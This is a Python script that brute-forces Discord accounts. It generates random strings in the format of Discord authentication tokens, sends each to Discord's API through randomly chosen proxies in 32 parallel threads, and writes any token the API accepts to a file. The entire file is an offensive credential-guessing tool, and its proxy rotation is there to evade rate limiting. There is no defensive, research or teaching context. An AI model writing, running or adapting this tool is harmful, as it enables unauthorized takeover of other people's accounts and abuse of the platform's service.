import os
import random
import string
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

import proxygen

N = input("How many tokens : ")
current_path = os.path.dirname(os.path.realpath(__file__))
url = "https://discordapp.com/api/v6/users/@me/library"
working_tokens_path = os.path.join(current_path, "workingtokens.txt")


def generate_token():
    base64_part = base64.b64encode(os.urandom(18)).decode("ascii").rstrip("=")
    while "==" in base64_part:
        base64_part = base64.b64encode(os.urandom(18)).decode("ascii").rstrip("=")

    return (
        base64_part
        + "."
        + random.choice(string.ascii_letters).upper()
        + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(5))
        + "."
        + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
    )


def validate_token(token):
    proxies = proxygen.get_proxies()
    proxy_pool = list(proxies)
    proxy = random.choice(proxy_pool) if proxy_pool else None

    headers = {
        "Content-Type": "application/json",
        "authorization": token,
    }

    proxy_config = None
    if proxy:
        proxy_config = {"https": "http://" + proxy}

    try:
        response = requests.get(url, headers=headers, proxies=proxy_config, timeout=10)
        print(response.text)
        print(token)

        if response.status_code == 200:
            print("\u001b[32;1m[+] Token Works!\u001b[0m")
            return token
        if "rate limited." in response.text:
            print("[-] You are being rate limited.")
        else:
            print("\u001b[31m[-] Invalid Token.\u001b[0m")
    except requests.exceptions.RequestException as exc:
        print(f"Request failed for {token}: {exc}")

    return None


def main():
    try:
        target = max(0, int(N))
    except ValueError:
        print("Please enter a valid integer.")
        return

    valid_tokens = []
    workers = min(32, max(1, target))

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(validate_token, generate_token()) for _ in range(target)]
        for future in as_completed(futures):
            token = future.result()
            if token:
                valid_tokens.append(token)

    if valid_tokens:
        with open(working_tokens_path, "a", encoding="utf-8") as file:
            for token in valid_tokens:
                file.write(token + "\n")

    print(f"Finished. Found {len(valid_tokens)} valid tokens.")


if __name__ == "__main__":
    main()
